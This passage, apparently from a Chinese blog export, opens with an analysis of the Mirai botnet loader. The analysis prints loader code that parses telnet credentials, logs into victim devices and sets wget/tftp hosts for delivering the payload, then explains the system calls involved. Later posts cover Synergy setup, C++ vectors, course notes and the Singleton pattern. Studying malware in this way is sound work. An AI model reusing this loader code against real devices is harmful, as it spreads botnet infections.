\u0026quot;100.200.100.100\u0026quot;)) == NULL) { printf(\u0026quot;Failed to initialize server. Aborting\\n\u0026quot;); return 1; } pthread_create(\u0026amp;stats_thrd, NULL, stats_thread, NULL); while (TRUE) { char strbuf[1024]; if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break; util_trim(strbuf); if (strlen(strbuf) == 0) { usleep(10000); continue; } memset(\u0026amp;info, 0, sizeof(struct telnet_info)); if (telnet_info_parse(strbuf, \u0026amp;info) == NULL) printf( \u0026quot;Failed to parse telnet info: \\\u0026quot;%s\\\u0026quot; Format -\u0026gt; ip:port user:pass \u0026quot; \u0026quot;arch\\n\u0026quot;, strbuf); else { if (srv == NULL) printf(\u0026quot;srv == NULL 2\\n\u0026quot;); server_queue_telnet(srv, \u0026amp;info); if (total++ % 1000 == 0) sleep(1); } ATOMIC_INC(\u0026amp;srv-\u0026gt;total_input); } printf(\u0026quot;Hit end of input.\\n\u0026quot;); while (ATOMIC_GET(\u0026amp;srv-\u0026gt;curr_open) \u0026gt; 0) sleep(1); return 0; } static void *stats_thread(void *arg) { uint32_t seconds = 0; while (TRUE) { fflush(stdout); sleep(1); } }  Main.c文件中有这样几个重要的结构体：\n static struct server *srv; 全局变量 struct telnet_info info; 局部变量  几个重要的函数\n binary_init() 函数 srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026ldquo;100.200.100.100\u0026rdquo;, 80,\u0026ldquo;100.200.100.100\u0026rdquo;)) == NULL) 里面的server_create函数。 最后循环里面的：telnet_info_parse(strbuf, \u0026amp;info) 与 server_queue_telnet(srv, \u0026amp;info)函数  server_create 函数调用（Server.c） 在main.c里面的main函数中调用了server_create函数来创建了服务器用来支持sftp和wget协议。\nmain.c\nif ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026quot;100.200.100.100\u0026quot;, 80, \u0026quot;100.200.100.100\u0026quot;)) == NULL) { printf(\u0026quot;Failed to initialize server. Aborting\\n\u0026quot;); return 1; }  server.c\nstruct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip) { struct server *srv = calloc(1, sizeof(struct server)); struct server_worker *workers = calloc(threads, sizeof(struct server_worker)); int i; srv-\u0026gt;bind_addrs_len = addr_len; // Default = 2 srv-\u0026gt;bind_addrs = addrs; srv-\u0026gt;max_open = max_open; // 1024 * 64 srv-\u0026gt;wget_host_ip = wghip; // 100.200.100.100 srv-\u0026gt;wget_host_port = wghp; // 80 srv-\u0026gt;tftp_host_ip = thip; // 100.200.100.100 srv-\u0026gt;estab_conns = calloc(max_open * 2, sizeof(struct connection *)); srv-\u0026gt;workers = calloc(threads, sizeof(struct server_worker)); srv-\u0026gt;workers_len = threads; if (srv-\u0026gt;estab_conns == NULL) { printf(\u0026quot;Failed to allocate establisted_connections array.\\n\u0026quot;); exit(0); } for (i = 0; i \u0026lt; max_open * 2; i++) { srv-\u0026gt;estab_conns[i] = calloc(1, sizeof(struct connection)); if (srv-\u0026gt;estab_conns[i] == NULL) { printf(\u0026quot;Failed to allocate connection %d\\n\u0026quot;, i); exit(-1); } pthread_mutex_init(\u0026amp;(srv-\u0026gt;estab_conns[i]-\u0026gt;lock), NULL); } // Create worker threads for (i = 0; i \u0026lt; threads; i++) //有多少个处理器 { struct server_worker *wrker = \u0026amp;srv-\u0026gt;workers[i]; //定义的指针只想src-\u0026gt;worker的地址 wrker-\u0026gt;srv = srv; //相互指定 wrker-\u0026gt;thread_id = i; if ((wrker-\u0026gt;efd = epoll_create1(0)) == -1) { printf(\u0026quot;Failed to initialize epoll context. Error code %d\\n\u0026quot;, errno); free(srv-\u0026gt;workers); free(srv); return NULL; } pthread_create(\u0026amp;wrker-\u0026gt;thread, NULL, worker, wrker); } pthread_create(\u0026amp;srv-\u0026gt;to_thrd, NULL, timeout_thread, srv); return srv; }  这个函数完成了服务器的配置，确定了服务器方的tftp和wget的服务提供方式，以及Port的编号。\n 代码中的几个函数说明 sysconf函数  sysconf函数： Get configuration information at run time\n#include \u0026lt;unistd.h\u0026gt; long sysconf(int name);  pthread_mutex_init函数 pthread_mutex_init(\u0026amp;(srv-\u0026gt;estab_conns[i]-\u0026gt;lock), NULL);\n  pthread_mutex_init(pthread_mutex_t * mutex,const pthread_mutexattr_t *attr); 初始化锁变量mutex。attr为锁属性，NULL值为默认属性。 pthread_mutex_lock(pthread_mutex_t *mutex);加锁 pthread_mutex_tylock(pthread_mutex_t *mutex);加锁，但是与2不一样的是当锁已经在使用的时候，返回为EBUSY，而不是挂起等待。 pthread_mutex_unlock(pthread_mutex_t *mutex);释放锁 pthread_mutex_destroy(pthread_mutex_t *mutex);使用完后释放   epoll函数 epoll 与 FreeBSD的kqueue类似，都向用户空间提供了自己的文件描述符来进行操作。\nint epoll_create(int size);\n建一个epoll的句柄，size用来告诉内核需要监听的数目一共有多大。当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close() 关闭，否则可能导致fd被耗尽。\nint epoll_create1(int flag);\n它和epoll_create差不多，不同的是epoll_create1函数的参数是flag，当flag是0时，表示和epoll_create函数完全一样，不需要size的提示了。\n当flag = EPOLL_CLOEXEC，创建的epfd会设置FD_CLOEXEC。\n当flag = EPOLL_NONBLOCK，创建的epfd会设置为非阻塞\n一般用法都是使用EPOLL_CLOEXEC.\n它是fd的一个标识说明，用来设置文件close-on-exec状态的。当close-on-exec状态为0时，调用exec时，fd不会被关闭；状态非零时则会被关闭，这样做可以防止fd泄露给执行exec后的进程。关于exec的用法，大家可以去自己查阅下，或者直接man exec。\npthread_create函数 #include \u0026lt;pthread.h\u0026gt; int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); Compile and link with -pthread.  The pthread_create() function starts a new thread in the calling process. The new thread starts execution by invoking start_routine(); arg is passed as the sole argument of start_routine(). 若成功则返回0，否则返回出错编号\n参数\n　第一个参数为指向线程标识符的指针。\n　第二个参数用来设置线程属性。\n　第三个参数是线程运行函数的起始地址。\n最后一个参数是运行函数的参数。\n去掉字符串前后的空格 // 用来处理前后空格的问题 char *util_trim(char *str) { char *end; while(isspace(*str)) //处理前面的空格 str++; if(*str == 0) //指向了 0 , 就是输入的地一个字符是 0 的话，那么就直接返回去这个 str return str; //strlen()用来计算指定的字符串s 的长度，不包括结束字符\u0026quot;\\0\u0026quot;。 end = str + strlen(str) - 1; //判断结束位置---移动到最后一个 /0 之前 while(end \u0026gt; str \u0026amp;\u0026amp; isspace(*end)) //如果end位置大约str的擦汗你高度，并且end位置为空的话，那就移动回来 end--; *(end+1) = 0; //给出结束位置 return str; } char strbuf[1024]; util_trim(strbuf);  memset函数 函数原型是：void *memset(void *s, int ch, size_t n);\n函数功能是：将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值， 第一个值为指定的内存地址，块的大小由第三个参数指定，这个函数通常为新申请的内存做初始化工作， 其返回值为指向s的指针，它是对较大的结构体或数组进行清零操作的一种最快方法。\nmemset函数通常用来对一块已经分配地址的内存进行初始化，并且通常初始化为0或者字符\u0026rsquo;\\0\u0026rsquo;（实际上是一样的）。\nstrtok 函数 函数原型：char *strtok(char *s, char *delim); 函数功能：把字符串s按照字符串delim进行分割，然后返回分割的结果。\n1.strtok函数的实质上的处理是，strtok在s中查找包含在delim中的字符并用NULL(’\\0′)来替换,直到找遍整个字符串。这句话有两层含义：（1）每次调用strtok函数只能获得一个分割单位。（2）要获得所有的分割单元必须反复调用strtok函数。\n2.strtok函数以后的调用时的需用NULL来替换s.\n3.形参s(要分割的字符串)对应的变量应用char s[]=”….”形式，而不能用char *s=”….”形式\n","date":1540793371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540793371,"objectID":"402b55c2b1a27c40f959b9ddfcdf438b","permalink":"http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/","publishdate":"2018-10-29T06:09:31Z","relpermalink":"/post/Mirai-loader-Code-Walking-thought/","section":"post","summary":"前言 The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly.","tags":"Mirai","title":"Mirai源代码分析1--Loader的工作过程","type":"post"},{"authors":null,"categories":"Application","content":"Introduce synergy可以实现 mac / linux / windows三个操作系统之间共享鼠标键盘，必须在所有机器上都安装这个软件，并进行相应的配置，有一台唯一的主机作为服务器端，其他主机作为客户端，要共享的那套鼠标键盘链接到端。所有主机都必须连入同一个局域网，会通过局域网交换鼠标键盘的输入信息，以实现其他主机共享使用这套鼠标键盘。\nDownload and install 因为在Ubuntu16.04上面比较好安装的版本是1.6.2，所以我为了能够在共享的过程中比较顺利，也选用的这个版本来完成的，在Window端下载1.6.2就好了。\n Linux: 使用命令行安装 Win10(64位): 下载地址  Linux(Ubuntu16.04)\nsudo apt-get install synergy  安装完成之后在终端使用synergy命令就可以打开软件了。\nsynergy  Window10端\n在Window端依旧选用安装的是1.6.2版本，为保证版本一致。下载下来之后，启动安装即可：\n分别在Linux和Window端安装完成之后运行软件检测版本是否对应，打开软件，在菜单栏help的位置可以看到版本信息。\nConfigure 配置过程比较方便，分别在Windows和Linux端运行软件：\n将你要使用的那台电脑的鼠标键盘共享给其他电脑使用的话，那就将这台电脑上面的Synergy设置成服务端，其余的全部设置成客户端就好了。\n这里需要特别注意，图片中的192.168.1.161并不是真正的你的IP地址，你需要打开网络适配器找到你真正的IP地址，这样其他的客户端才能够连接过来。然后再配置服务器里面需要连接过来的客户端的名称\n比如，在这里，我添加了一个叫做Chromebook的客户端，这里的名称是根据你客户端打开之后显示的名字决定的。在这里也配置了连接过来之后，屏幕显示的位置。\n然后打开客服端，在里面输入服务器的IP地址就可以连接了。\nIssue 连接被拒绝refued问题 这里需要保证两边的连接配置是一致的，在这里我给出我的配置方式，不需要使用加密的方式，如果使用加密的话，需要保证两端加密的秘钥是一致的。\n连接超时的问题：Time out 这个问题有两种情况：\n第一种情况：输出了错误的服务器IP地址，服务器的IP地址一定要自己查看网络适配器得到真正的IP地址，不要使用这个软件配置的时候推荐的IP地址，它真的很有可能是错误的。\n比如我使用的这一次，就会出现IP地址完全和它推荐的不一样的情况。这种情况怎么可以连接上的呢\n第二种情况：Windows里面的synergy服务被关闭了，在服务的选项里面去打开就好了。\n版本问题 尽量同时在客户端和服务器端使用相同的版本，保证最小限度的出现问题\nerror：unrecognised client name XXXXX screen name 是软件规定的，不能自己瞎取。在每个客户端/服务器上能查到，也可以通过edit-\u0026gt;setting修改\nERROR: failed to init synwinhk.dll 关闭synergy，从系统进程里关闭synergy的进程，再重新启动即可。\n","date":1540635271,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540635271,"objectID":"455bbf1ee11c9e642d51b3e430091255","permalink":"http://www.guozet.me/post/Application-Synergy/","publishdate":"2018-10-27T10:14:31Z","relpermalink":"/post/Application-Synergy/","section":"post","summary":"Introduce synergy可以实现 mac / linux / windows三个操作系统之","tags":"Application","title":"synergy局域网共享鼠标键盘软件教程","type":"post"},{"authors":null,"categories":"C++","content":"Introduce std::vector::push_back() Appends the given element value to the end of the container.\n The new element is initialized as a copy of value. value is moved into the new element.  If the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated. (Cite from: cppreference.com)\n Example Firstly, if we have a class String, then we can use this class to test the push_back() functions.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;vector\u0026gt; class string { public: string() : buf(new char[1]) { std::cout \u0026lt;\u0026lt; \u0026quot;default\u0026quot; \u0026lt;\u0026lt; std::endl; buf[0] = '\\0'; } string(const char* s) : buf(new char[strlen(s) + 1]) { std::cout \u0026lt;\u0026lt; \u0026quot;convert\u0026quot; \u0026lt;\u0026lt; std::endl; strcpy(buf, s); } explicit string(const string\u0026amp; s) : buf(new char[strlen(s.buf) + 1]) { std::cout \u0026lt;\u0026lt; \u0026quot;copy\u0026quot; \u0026lt;\u0026lt; std::endl; strcpy(buf, s.buf); } ~string() { std::cout \u0026lt;\u0026lt; \u0026quot;destructor\u0026quot; \u0026lt;\u0026lt; std::endl; delete[] buf; } string\u0026amp; operator=(const string\u0026amp; rhs) { std::cout \u0026lt;\u0026lt; \u0026quot;copy assign\u0026quot; \u0026lt;\u0026lt; std::endl; if (this == \u0026amp;rhs) return *this; delete[] buf; buf = new char[strlen(rhs.buf) + 1]; strcpy(buf, rhs.buf); return *this; } const char* getBuf() const { return buf; } private: char* buf; }; std::ostream\u0026amp; operator\u0026lt;\u0026lt;(std::ostream\u0026amp; out, const string\u0026amp; s) { return out \u0026lt;\u0026lt; s.getBuf(); }  Understand:\n The new element is initialized as a copy of value. value is moved into the new element.  int main() { std::vector\u0026lt;string\u0026gt; vec; vec.push_back(\u0026quot;test\u0026quot;); vec.push_back(\u0026quot;test2\u0026quot;); }  Output:\nconvert // Covert \u0026quot;test\u0026quot; to class string copy // Copy string(test) to vector destructor convert // Covert \u0026quot;test2\u0026quot; to class string copy // Size() \u0026gt; capacity(), then apply for a new memory, and copy \u0026quot;test\u0026quot; to new vector. copy // Copy string(test2) to vector destructor destructor destructor destructor  In the case, I used this example to test how to initialize a new element in the vector. Like this case, when we new an object, we copy this object into vector. After that, we can delete this object.\n Convert a new string object 1 Copy the string object 1 to the string object 2, and move string object 2 into the new element. Delete the string object 1   std::vector::emplace_back (Since C++ 11) Appends a new element to the end of the container. The element is constructed through std::allocator_traits::construct, which typically uses placement-new to construct the element in-place at the location provided by the container. The arguments args\u0026hellip; are forwarded to the constructor as std::forward(args)\u0026hellip;.\nIf the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated.\nExample int main() { std::vector\u0026lt;string\u0026gt; vec; vec.emplace_back(\u0026quot;TEST\u0026quot;); vec.emplace_back(\u0026quot;TES3\u0026quot;); }  Output:\nconvert convert copy // Copy the first one from the old vector memory to the new memory destructor destructor destructor ","date":1540260571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540260571,"objectID":"04bd5829c0995fdcda7f81ff003fff47","permalink":"http://www.guozet.me/post/C++-Vector-pushback-vs-emplaceback/","publishdate":"2018-10-23T02:09:31Z","relpermalink":"/post/C++-Vector-pushback-vs-emplaceback/","section":"post","summary":"Introduce std::vector::push_back() Appends the given element value to the end of the container.\n The new element is initialized as a copy of value. value is moved into the new element.  If the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated. (Cite from: cppreference.com)\n","tags":"C++","title":"C++ vector push_back() Vs emplace_back","type":"post"},{"authors":null,"categories":["2D Game","Engine","Construction"],"content":"2D游戏引擎设计这门课程是我在CU的2018 Fall选修的一门专业核心课程，老师是Clemson CS系比较受欢迎的 Brian Malloy教授。\n 课程内容 Week1 Aug 28, Tue:\n Office hour: Wed 10-11:30 AM Quiz on Tue or Thu Answer Ques about Basics or Classes:  ternery operator namespaces if (0)   Do the Rule of 3  本周的重点内容是C++的基本语法以及Classes的使用 和 C++ Rule of 3的规则应用。在这里分别整理了两个部分的博客文章：\n  C++ Rule of 3  Aug 30, Thu:\n refs vs ptrs r-value references Introduce SDL draw functions Review Rule of 3 \u0026ndash; how to reproduce no crash? Illustrate the functions that are called: whatcalls Trace the Rule of 3 example from cppreference Rule of 0 Introduce vectors:  size vs capacity push_back vs emplace_back    Week2 Sep 4, Tue\n Review what get\u0026rsquo;s called:  why prefer init vs assign   Introduce vectors:  size vs capacity value semantics emplace_back   Marcus Painting Project #2 Quiz #1 review  Week3 Sep 11, Tue:\n Review the quiz Why no vector.push_front() ??? When to use emplace_back()? A temp is always an r-value reference review Rule of 3, Rule of 0, Rule of 5  Sep 13, Thu:\n Your game: can definitely be a \u0026ldquo;cover\u0026rdquo;  Keep the scope manageable \u0026ndash; one level, etc.   Terminology:  move assignment vs copy assignment copy constructor vs move constructor   Questions about move semantics ranged for loops:  ints: size vs cap C++ strings why no push_front for vector?   Drawing a texture: GPU  Makefile   Drawing a Surface: CPU  Week4 Sep 18, Tue:\n static variables Design Patterns The Singleton Design Pattern Animations with SDL:  cpu clock vs game clock Why clear the screen   Inheritance:  Sep 20, Thu:\n Sammy\u0026rsquo;s dilemma Project #2 \u0026ndash; let\u0026rsquo;s look at my solution. The Meyer\u0026rsquo;s Singleton Polymorphism:  see poly example shapes example   Use g++ not clang++ for effc++ warnings Project #3 and the tracker framework  default vs delete for constructors/destructors ranged for vs while when to use auto function overload transparency vs alpha channel Parallax Scrolling Getting images vs \u0026ldquo;rolling your own\u0026rdquo; Making videos why use g++ vs clang++ XML    理解为什么要使用 Singleton设计模式，已详细分析了为什么要使用singleton模式，以及Singleton设计模式的好处和如何来书写Singleton. 请参考博客:\n  C++软件设计模式之Singleton 包含了两种Singleton的书写方式  Week 5 Sep 25, Tue:\n Last time: Many spinning stars \u0026ndash; tweak velocity using XML velocity as base! Parallax Scrolling is easy \u0026ndash; it\u0026rsquo;s already in the code string streams making a video  Sep 27, Thu:\n Quiz #2  Week 6 Oct 2, Tue:\n maps sorting:  vectors lists   emplace_back: how to use? Why Singleton:  Gamedata? Clock?   Two-way sprites? SpriteSheet Project #2 \u0026ndash; CANDY  Oct 4, Thu:\n Jacob Wood IoMod: overload writeText  put in Engine::draw, which is const! Engine::update is NOT const! draw and update called every iteration of the event list   Why Singleton:  Gamedata \u0026ndash; yes Clock \u0026ndash; no!   Clock and fps string streams Two-way sprites? SpriteSheet projects from last year project #4 sorting:  vectors lists    Week 7 Oct 9, Thu\n Why Singleton:  Gamedata \u0026ndash; yes Clock \u0026ndash; no!   Clock and fps string streams Two-way sprites? SpriteSheet A Player Class  Oct 11, Thu:\n  Does anyone get a black screen on startup?\n  Good rule to follow: pre-load assets! e.g.: collision strategies.\n  Reminder: Exam #1 in one week!\n  Modifications to ImageFactory and/or SpriteSheet???\n  Review:\n How to make video for #3 Adding a Player for #4  slide or no slide? how to fit player into tracker framework to cast or not to cast, that is the question. Where to put stuff in Engine.cpp      Nested Classes: the Clock class\n  Collisions\n  AI:\n observer pattern    Week 8 Oct 16, Tue:\n Erasing from a list. Vector. map Project #4 Exam #1  Oct 18, Thu:\n Review Observer Quiz #2 Sorting vectors and lists  Week 9 Oct 25, Thu:\n github repo player/composition ==\u0026gt; it\u0026rsquo;s composition so need player.getVelocity() drawable.h in tracker framework didn\u0026rsquo;t have method getSurface input/mouse2  to get pixel color see getPixel    Week 10 Nov 1, Thu:\n Write a fn object Review lamda functions Show lamda in sort Review Explosions Health bar (in your repo)  A model for your HUD!    Week 11 Nov 8, Tue:\n Review fn objects and lambda functions Review the two classes needed for Chunk explosions Review Object pool  Quiz 3\n Sort  Funciton object lambda Funciton   Search in a list, vector, map Erasing from a list. Vector, map observer pattern static_cast Vs dynamic_cast   自己动手写游戏引擎  概述 设计使用C++画出来图形 做一个Object移动的模式 ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"56ded845904e5a50a4fe8084f1c781b4","permalink":"http://www.guozet.me/post/2D-Game-Engine-Construction/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/2D-Game-Engine-Construction/","section":"post","summary":"2D游戏引擎设计这门课程是我在CU的2018 Fall选修的一门专业核心课程，老师是Clemson CS系比较受欢迎的 Brian Malloy教授。\n","tags":"Game","title":"2-D Game Engine Construction (CU CPSC6160)","type":"post"},{"authors":null,"categories":"Paper","content":"Network relation  Kitsune: An Ensemble of Autoencoders for Online Network Intrusion Detection [ PDF] [ Slide] [ Video]  Cloud Computing ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"799237fd0ab32aaf014558c6959fa769","permalink":"http://www.guozet.me/post/All-Paper-Which-I-Read/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/All-Paper-Which-I-Read/","section":"post","summary":"Network relation  Kitsune: An Ensemble of Autoencoders for Online Network Intrusion Detection [ PDF] [ Slide] [ Video]  Cloud Computing ","tags":"Paper","title":"Paper Reading list","type":"post"},{"authors":null,"categories":"Translation of Programming Languages","content":"编译原理这门课程是我在CU的2018 Fall选修的一门专业核心课程，老师是Clemson CS系比较受欢迎的 Brian Malloy教授。在他的个人主页上面也有Python, C++， 2D游戏的教程，非常适合对CS感兴趣的同学学习。\n 课程内容 Week1 Aug 28, Tue\n Read Section 1, the Introduction, to grammarware paper Discuss slides about Grammars Answer questions about Basics and Classes Do the Rule of 3  本周的重点内容是C++的基本语法以及Classes的使用 和 C++ Rule of 3的规则应用。在这里分别整理了两个部分的博客文章：\n  C++ Rule of 3  Aug 30, Thu\n Regular grammars and regular expressions Review Rule of 3 What gets called The Rule of 5 The Rule of Zero  Week2 Sep 4, Tue\n What gets called  Why prefer init over assign?!   Introduce vectors  size vs capacity value semantics   Intro to Flex Project #2 Quiz #1 \u0026ndash; Thursday  Week3 Sep 13, Thu\n Questions about move semantics?  Well I have one?   flex:  ambiguity: codes first wc states line numbers: lineno debug mode   static varsux Singleton Pattern (单例设计模式)  理解为什么要使用 Singleton设计模式，已详细分析了为什么要使用singleton模式，以及Singleton设计模式的好处和如何来书写Singleton. 请参考博客:\n  C++软件设计模式之Singleton  Week4 Sep 20, Thu\n The Bison Parser Generator: shift/reduce parsing LALR(1) Balanced Parens \u0026ndash; adding sets of them sum \u0026ndash; adding numbers  Week 5 Sep 25, Tue\n conflicts \u0026ndash; the pointer model  Inserting semantic actions: simple \u0026ndash; no actions but prec set noPrec \u0026ndash; grammar refactored, no prec set calc \u0026ndash; calculator example \u0026ndash; no variables typedStack \u0026ndash; calculator w/ variables   Project #3 Exam #1 \u0026ndash; everything up to and incl today  Sep 27. Thu\n Exam #1 \u0026ndash; everything up to and incl today  Week 6 Oct 2. Tue\n Containers  vectors List Map   Review Exam  Singleton Exponent Radon   Inheritance  Oct 4. Thu\n emplace_back \u0026ndash; When it help?  项目内容 项目  自己动手写Python编译器  概述 Python 源程序 使用flex做词法分析 上下文无关语法及分析 自顶向下分析 自底向上分析 使用Bison做语法分析 Python编译器 ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"2e5197ff472ee2898c3746c3733e6318","permalink":"http://www.guozet.me/post/Translation-of-Programming-Languages-index/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/Translation-of-Programming-Languages-index/","section":"post","summary":"编译原理这门课程是我在CU的2018 Fall选修的一门专业核心课程，老师是Clemson CS系比较受欢迎的 Brian Malloy教授。在他的个人主页上面也有Python, C++， 2D游戏的教程，非常适合对CS感兴趣的同学学习。\n","tags":["C++","Translation","Flex","Bision"],"title":"Translation of Programming Languages(CU CPSC8270)","type":"post"},{"authors":null,"categories":"Algorithm","content":"Abstract Data Type What is the abstract data type? Specification of a data structure in terms of the operations it needs to support.\n Just a concrete(具体化) approach for implementation of a data structure that fulfills these requiremnts.\n Queues (FIFO behavior) Sometimes, we need a structure which can do these two things.\n Insert a new key k into the structure Remove the least-recently-inserted key from the structure.  But, how can we use the bacis structure arrays, list, stacks to implement the queues. Firstly, we can\u0026rsquo;t use the stacks to implement it. So, we try to implement the queues by arrays and list.\n Circular array   class Queue{ public: Queue(); ~Queue(); void insert(int key); int remove(void); private: int *A; int front, back, N; } int Queue::remove(void) { int result = A[back]; back = (back+1) % N; return result; } int Queue::insert(int x) { A[front] = x; front = (front+1) % N; }  Linked list   // A C program to demonstrate linked list based implementation of queue #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; // A linked list (LL) node to store a queue entry struct QNode { int key; struct QNode *next; }; // The queue, front stores the front node of LL and rear stores ths // last node of LL struct Queue { struct QNode *front, *rear; }; // A utility function to create a new linked list node. struct QNode *newNode(int k) { struct QNode *temp = (struct QNode *)malloc(sizeof(struct QNode)); temp-\u0026gt;key = k; temp-\u0026gt;next = NULL; return temp; } // A utility function to create an empty queue struct Queue *createQueue() { struct Queue *q = (struct Queue *)malloc(sizeof(struct Queue)); q-\u0026gt;front = q-\u0026gt;rear = NULL; return q; } // The function to add a key k to q void enQueue(struct Queue *q, int k) { // Create a new LL node struct QNode *temp = newNode(k); // If queue is empty, then new node is front and rear both if (q-\u0026gt;rear == NULL) { q-\u0026gt;front = q-\u0026gt;rear = temp; return; } // Add the new node at the end of queue and change rear q-\u0026gt;rear-\u0026gt;next = temp; q-\u0026gt;rear = temp; } // Function to remove a key from given queue q struct QNode *deQueue(struct Queue *q) { // If queue is empty, return NULL. if (q-\u0026gt;front == NULL) return NULL; // Store previous front and move front one node ahead struct QNode *temp = q-\u0026gt;front; q-\u0026gt;front = q-\u0026gt;front-\u0026gt;next; // If front becomes NULL, then change rear also as NULL if (q-\u0026gt;front == NULL) q-\u0026gt;rear = NULL; return temp; } // Driver Program to test anove functions int main() { struct Queue *q = createQueue(); enQueue(q, 10); enQueue(q, 20); deQueue(q); deQueue(q); enQueue(q, 30); enQueue(q, 40); enQueue(q, 50); struct QNode *n = deQueue(q); if (n != NULL) printf(\u0026quot;Dequeued item is %d\u0026quot;, n-\u0026gt;key); return 0; }   Queues Example Question: Given N numbers, do two of them sum to 42 We can find the number which is equal to 42-X for each number X. There are two steps for this question.\n Sort the numbers. ) For each number X in the array, use Binary search to see if 42-X is also present in the array.  \u0026laquo;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-TODO:\u0026ndash;Not Finshed\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026raquo;\n","date":1538705371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538705371,"objectID":"a86077f7e2a533fe2dc5a199fc36dddd","permalink":"http://www.guozet.me/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/","publishdate":"2018-10-05T02:09:31Z","relpermalink":"/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/","section":"post","summary":"Abstract Data Type What is the abstract data type? Specification of a data structure in terms of the operations it needs to support. Just a concr","tags":"Algorithm","title":"Algorithm Introduce 2 - Abstract Data types and Hash Tables","type":"post"},{"authors":null,"categories":"C++","content":"什么是Singleton? 单例模式（Singleton），保证一个类仅有一个实例，并提供一个访问它的全局访问点。\n 可以考虑在下面的一些场景中应用：\n Windows的Task Manager（任务管理器）就是很典型的单例模式（这个很熟悉吧），想想看，是不是呢，你能打开两个windows task manager吗？ 不信你自己试试看哦~  windows的Recycle Bin（回收站）也是典型的单例应用。在整个系统运行过程中，回收站一直维护着仅有的一个实例。 网站的计数器，一般也是采用单例模式实现，否则难以同步。 应用程序的日志应用，一般都何用单例模式实现，这一般是由于共享的日志文件一直处于打开状态，因为只能有一个实例去操作，否则内容不好追加。 Web应用的配置对象的读取，一般也应用单例模式，这个是由于配置文件是共享的资源。 在数据库连接池的设计一般也是采用单例模式，因为数据库连接是一种数据库资源。数据库软件系统中使用数据库连接池，主要是节省打开或者关闭数据库连接所引起的效率损耗，这种效率上的损耗还是非常昂贵的，因为何用单例模式来维护，就可以大大降低这种损耗。 多线程的线程池的设计一般也是采用单例模式，这是由于线程池要方便对池中的线程进行控制。 操作系统的文件系统，也是大的单例模式实现的具体例子，一个操作系统只能有一个文件系统 上述内容来自于： 单例模式的常见应用场景   单例模式应用的场景一般发现在以下条件下：\n 资源共享的情况下，避免由于资源操作时导致的性能或损耗等。如上述中的日志文件，应用配置 控制资源的情况下，方便资源之间的互相通信。如线程池等。   如果不使用单例模式是什么样子呢？ 应用场景： 我们使用srand(time(0))去生产一个随机数字，因为这个函数生成的是伪随机数，所以如果我们很快的频率去调用这个函数的话，就会出现这个函数给出一个同样的随机数字。\n#include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: Random() { int seed = time(0); srand(seed); } int operator()(int a, int b) const { return (rand() % b) + a; } private: Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); }; int main() { Random random; std::cout \u0026lt;\u0026lt; random(1, 100) \u0026lt;\u0026lt; std::endl; }  Output:\n$./run 44 $./run //和第一次间隔时间比较长 72 $./run //后面三个运行程序的速度比较快的话，就会出现得到一样的随机数 44 $./run 44 $./run 44   Function rand () Vs srand()\n rand() function is used in C to generate random numbers. If we generate a sequence of random number with rand() function, it will create the same sequence again and again every time program runs. Say if we are generating 5 random numbers in C with the help of rand() in a loop, then every time we compile and run the program our output must be the same sequence of numbers. The srand() function sets the starting point for producing a series of pseudo-random integers. If srand() is not called, the rand() seed is set as if srand(1) were called at program start. Any other value for seed sets the generator to a different starting point. Standard prac tice is to use the result of a call to srand(time(0)) as the seed   使用单例模式 单一模式的实现方式：\n Place constructors and assignment in private section. Declare a static instance variable as a data attribute of the class Define the static instance variable somewhere in the anonymous namespace. Define a static class member function(getInstance) to access the instance variable.  glut实现模式 (懒汉模式（线程不安全）) #include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: static Random* getInstance(); //Define a static class member function int operator()(int a, int b) const { return (rand() % b) + a; } private: static Random* instance; //Declare a static instance variable Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); // Constructors and assignment in private Random() { int seed = time(0); srand(seed); } }; Random* Random::getInstance() { if ( !instance ) instance = new Random; return instance; } Random* Random::instance = NULL; //Define the static instance variable somewherr int main() { Random* random = Random::getInstance(); std::cout \u0026lt;\u0026lt; (*random)(1,100) \u0026lt;\u0026lt; std::endl; delete random; }  这种glut的单例模式存在这一定的问题，在《程序员的自我修养》中给出了一个例子。在单例模式中，这是一段典型的 double-check 的代码.\nvolatile T* 